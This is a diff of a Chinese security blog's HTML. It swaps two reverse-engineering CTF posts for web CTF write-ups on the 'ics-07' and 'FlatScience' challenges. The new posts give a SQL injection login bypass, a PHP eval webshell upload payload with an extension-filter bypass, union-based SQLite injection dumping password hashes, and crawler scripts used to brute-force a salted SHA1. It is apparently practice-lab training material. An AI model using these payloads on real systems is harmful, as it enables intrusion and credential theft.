@@ -108,37 +108,48 @@
     
     
     <article
-  id="post-3_python-trade"
+  id="post-ics-07"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/ics-07/"
+    >ics-07</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/3_python-trade/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.378Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/ics-07/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/ctf/">ctf</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="3-python-trade"><a href="#3-python-trade" class="headerlink" title="3_python-trade"></a>3_python-trade</h1><p>pyc 逆向 </p>
-<p>使用pyc反编译 </p>
-<p>网站</p>
-<p><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.gjw123.com/tools-pyc">http://www.gjw123.com/tools-pyc</a></p>
-<p>反编译结果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">visit https://tool.lu/pyc/ for more information</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encode(message):</span><br><span class="line">    s = &#x27;&#x27;</span><br><span class="line">    for i in message:</span><br><span class="line">        x = ord(i) ^ 32</span><br><span class="line">        x = x + 16</span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    return base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">print &#x27;Input flag:&#x27;</span><br><span class="line">flag = raw_input()</span><br><span class="line">if encode(flag) == correct:</span><br><span class="line">    print &#x27;correct&#x27;</span><br><span class="line">else:</span><br><span class="line">    print &#x27;wrong&#x27;</span><br></pre></td></tr></table></figure>
+  <p>进入后发现项目管理里面有子页面</p>
+<p>里面可以直接查看源代码   已经给出注释</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//这段就是无论如何都定向到flag.php</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">      page : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;page&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      id : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line">		<span class="comment">//如果session 是admin的session  就执行 </span></span><br><span class="line">         	<span class="comment">//CON 和file 是post的con 和file </span></span><br><span class="line">             <span class="comment">// 文件目录是backup/加上file</span></span><br><span class="line">         <span class="comment">//之后是对于con的waf</span></span><br><span class="line">         <span class="comment">//如果绕过waf ，文件就被提交到uploaded</span></span><br><span class="line">         <span class="comment">//con 是命令执行  就是传马的 所以最后是uploaded/backup/</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//就是你要有id id转浮点数不等于1 id最后一位是9 这个地方用万能密码绕过</span></span><br><span class="line">	<span class="comment">//可以让session 为admin</span></span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
+<p>给出payload</p>
+<p>url 是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.244:49771/index.php</span><br><span class="line">?page=flag.php</span><br><span class="line">&amp;id=1&#x27;or &#x27;9&#x27;=&#x27;9</span><br><span class="line">&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
 
+<p>data段是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con=&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;&quot;&amp;file=d.php/cmd.php/..</span><br></pre></td></tr></table></figure>
 
-<p>写脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span><br><span class="line">a = base64.b64decode(correct)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line">for i in a:</span><br><span class="line">    s += chr((ord(chr(i)) - 16) ^ 32)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
-
-<p>nctf{d3c0mpil1n9_PyC}</p>
-<p>其中s += chr((ord(chr(i)) - 16) ^ 32) 如果没有chr强转会报ord 的错</p>
  
       <!-- reward -->
       
@@ -159,27 +170,116 @@
 
     
     <article
-  id="post-2_insanity"
+  id="post-FlatScience"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/FlatScience/"
+    >flatscience</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/2_insanity/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.375Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/FlatScience/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="2-insanity"><a href="#2-insanity" class="headerlink" title="2_insanity"></a>2_insanity</h1><p>丢ida 找到main函数 F5大法</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa6c4azsvj30jz06ntam.jpg" alt="image.png"></p>
-<p>很明显 追踪&amp;strs</p>
-<p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211110171836918.png" alt="image-20211110171836918"></p>
-<p>flag</p>
+  <p>dirseach 扫 有爬虫文件    发现隐藏文件 </p>
+<p>访问</p>
+<p>/login.php</p>
+<p>F12 有注释</p>
+<p>进入/login.php?debug</p>
+<p>代码审计 </p>
+<p>sqlmap扫</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc809d4ybj30yo013t9i.jpg" alt="ima1e.png"></p>
+<p>根据自己样子改</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc81lnmplj31ae079dn7.jpg" alt="image.png"></p>
+<p> SQLite_masterdb</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc837ravej30r8089441.jpg" alt="image.png"></p>
+<p>sql注入</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc8o5364aj30yq0daq89.jpg" alt="image.png"></p>
+<p>没报错 </p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc8omzwmjj30yo0ckafh.jpg" alt="image.png"></p>
+<p>报错</p>
+<p>字段数为2</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc8qx7u0bj30z00eiwmr.jpg" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; expires=Fri, 12-Nov-2021 04:11:59 GMT; Max-Age=60; path=/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>url 解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE+TABLE+Users(id+int+primary+key,name+varchar(255),password+varchar(255),hint+varchar(255)); expires=Fri, 12-Nov-2021 04:11:59 GMT; Max-Age=60; path=/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>整理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Users</span><br><span class="line">(</span><br><span class="line">    id       int primary key,</span><br><span class="line">    name     varchar(255),</span><br><span class="line">    password varchar(255),</span><br><span class="line">    hint     varchar(255)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>和之前sqlmap爬出来的一样</p>
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pw=&amp;usr=1&#x27;union select 1,group_concat(name,password) from Users--+</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p>admin54eae8935c90f467427f05e4ece82cf569f89507fritze34b0bb7c304949f9ff2fc101eef0f048be10d3bdhansi</p>
+<p>所以 admin 的密码哈希是 </p>
+<p>54eae8935c90f467427f05e4ece82cf569f89507</p>
+<p>查询下hint</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name=+my+fav+word+in+my+fav+paper%3F%21; expires=Fri, 12-Nov-2021 04:18:01 GMT; Max-Age=60; path=/</span><br></pre></td></tr></table></figure>
+
+<p>然后代码审计</p>
+<p>.sha1($pass.”Salz!”)</p>
+<p>这个的意思是 密码加盐后在进行 sha1 运算  sha1 是md5加强升级版</p>
+<p>所以逻辑就是 </p>
+<p>sha1($pass.”Salz!”)==54eae8935c90f467427f05e4ece82cf569f89507</p>
+<p>偷个懒 cmd5   <a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc9bqzaqmj31110cfq5q.jpg" alt="image.png"></p>
+<p>穷人流下了眼泪</p>
+<p>爷自己爆破</p>
+<p>提示</p>
+<p>我最爱的单词在我最爱的文章中</p>
+<p>康康文章</p>
+<p>密码应该是文章里的一个单词</p>
+<p>先下载下来</p>
+<p>自己写一个全站pdf爬虫 思路是先搞一个函数 负责扫描全站 </p>
+<p>在搞一个递归函数找子页面 负责的调用扫描函数 ，全站找pdf文件</p>
+<p><strong>理论可行 实践开始</strong></p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwcebnvv63j31m1076wmz.jpg" alt="image.png"></p>
+<p>这题目暗算我 卧槽  我说写了怎么就都是死循环</p>
+<p>害我的浪费好多实践</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwceikbf1cj30vi0getfu.jpg" alt="image.png"></p>
+<p>这是payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> wget</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_pdf</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># if re.match(&#x27;.*/index.html/*&#x27;, url):</span></span><br><span class="line">    <span class="comment">#     url = url.replace(&#x27;index.html/&#x27;,&#x27;&#x27;)</span></span><br><span class="line">    <span class="comment"># if re.match(&#x27;.*/../.*&#x27;, url):</span></span><br><span class="line">    <span class="comment">#     url = url.replace(&#x27;../&#x27;,&#x27;&#x27;)</span></span><br><span class="line">    <span class="built_in">list</span> = []  <span class="comment"># 作为保存下载链接的列表</span></span><br><span class="line">    <span class="comment"># burp0_url = &quot;http://111.200.241.244:51285/&quot;</span></span><br><span class="line">    burp0_url = url</span><br><span class="line">    <span class="keyword">if</span>  re.match(<span class="string">&#x27;.*pdf&#x27;</span>, url):</span><br><span class="line">        <span class="comment"># print(list)</span></span><br><span class="line">            <span class="comment">#为了递归做准备</span></span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># url = url.replace(&#x27;index.html/&#x27;,&#x27;&#x27;) + &#x27;/&#x27;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;42vk7uq3siu00c&quot;</span></span><br><span class="line">                                      <span class="string">&quot;svncvn1cr3o4&quot;</span>, <span class="string">&quot;td_cookie&quot;</span>: <span class="string">&quot;298269563&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;If-None-Match&quot;</span>: <span class="string">&quot;\&quot;3ff-575a2df88f5c0-gzip\&quot;&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;If-Modified-Since&quot;</span>: <span class="string">&quot;Wed, 12 Sep 2018 01:54:39 GMT&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">        html=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">        html=html.text</span><br><span class="line">        <span class="comment"># print(html)</span></span><br><span class="line">        content=etree.HTML(html)</span><br><span class="line">        <span class="comment"># print(content)</span></span><br><span class="line">        result = content.xpath(<span class="string">&#x27;//body/a&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="comment"># print(&quot;================&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> result:</span><br><span class="line">            <span class="comment"># print(each)</span></span><br><span class="line">            <span class="comment"># print(each.attrib[&#x27;href&#x27;])  #解析文件的下载链接</span></span><br><span class="line">            temp=each.attrib[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">&#x27;.*/index.html/&#x27;</span>, url + <span class="string">&#x27;/&#x27;</span> + temp):</span><br><span class="line">                url = url.replace(<span class="string">&#x27;/index.html/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                url = url.replace(<span class="string">&#x27;/index.html&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="comment"># print(&quot;=========&quot;,url)</span></span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">&#x27;.*../index&#x27;</span>, temp):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">&#x27;.*.html&#x27;</span>, url+<span class="string">&#x27;/&#x27;</span>+temp):</span><br><span class="line">                <span class="built_in">print</span>(url+<span class="string">&#x27;/&#x27;</span>+temp)</span><br><span class="line">                <span class="comment"># if re.match(&#x27;.*/index.html/.*&#x27;, url + &#x27;/&#x27; + temp):</span></span><br><span class="line">                <span class="comment">#     scan_pdf(url.replace(&#x27;/index.html/&#x27;, &#x27;&#x27;) + &#x27;/&#x27; + temp)  # 用递归找子页面里面的pdf文件</span></span><br><span class="line">                <span class="keyword">if</span> re.match(<span class="string">&#x27;.*index.html/&#x27;</span>, url+<span class="string">&#x27;/&#x27;</span>+temp):  <span class="comment">#防止出现类似http://111.200.241.244:51285//1/index.html/3/index.html的东西</span></span><br><span class="line">                    <span class="comment"># print(&quot;==========================&quot;+url.replace(&#x27;index.html/&#x27;,&#x27;&#x27;) + &#x27;/&#x27; + temp)</span></span><br><span class="line">                    scan_pdf(url.replace(<span class="string">&#x27;index.html/&#x27;</span>,<span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;/&#x27;</span> + temp)  <span class="comment"># 用递归找子页面里面的pdf文件</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    scan_pdf(url+<span class="string">&#x27;/&#x27;</span>+each.attrib[<span class="string">&#x27;href&#x27;</span>])  <span class="comment"># 用递归找子页面里面的pdf文件</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                    <span class="comment"># break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print()</span></span><br><span class="line">                <span class="comment"># print()</span></span><br><span class="line">                wget.download(url+<span class="string">&#x27;/&#x27;</span>+each.attrib[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">                <span class="built_in">list</span>.append(each.attrib[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def scan_html(url):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a= <span class="string">&quot;http://111.200.241.244:50932&quot;</span>  <span class="comment"># 在此处更改payload</span></span><br><span class="line">    <span class="comment"># list_result=[]</span></span><br><span class="line">    scan_pdf(a)</span><br><span class="line">    <span class="comment"># print(list_result)</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>贴个大佬的爬虫payload（小改了一下，有些bug）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import wget</span><br><span class="line"></span><br><span class="line">re1 = &#x27;[a-fA-F0-9]&#123;32,32&#125;.pdf&#x27;</span><br><span class="line">re2 = &#x27;[0-9\/]&#123;2,2&#125;index.html&#x27;</span><br><span class="line"></span><br><span class="line">pdf_list = []</span><br><span class="line">def get_pdf(url):</span><br><span class="line">    global pdf_list </span><br><span class="line">    print(url)</span><br><span class="line">    req = requests.get(url).text</span><br><span class="line">    re_1 = re.findall(re1,req)</span><br><span class="line">    for i in re_1:</span><br><span class="line">        pdf_url = url+i</span><br><span class="line">        # print(pdf_url)</span><br><span class="line">        pdf_list.append(pdf_url)</span><br><span class="line">    re_2 = re.findall(re2,req)</span><br><span class="line">    for j in re_2:</span><br><span class="line">        new_url = url+j[0:2]</span><br><span class="line">        get_pdf(new_url)</span><br><span class="line">    return pdf_list</span><br><span class="line"></span><br><span class="line">pdf_list = get_pdf(&#x27;http://111.200.241.244:50932/&#x27;)</span><br><span class="line">for i in pdf_list:</span><br><span class="line">    wget.download(i)</span><br></pre></td></tr></table></figure>
+
+<p>优美的代码 羡慕了</p>
+<p>解析pdf找单词的偷个懒 </p>
+<p>贴个R3col大佬的</p>
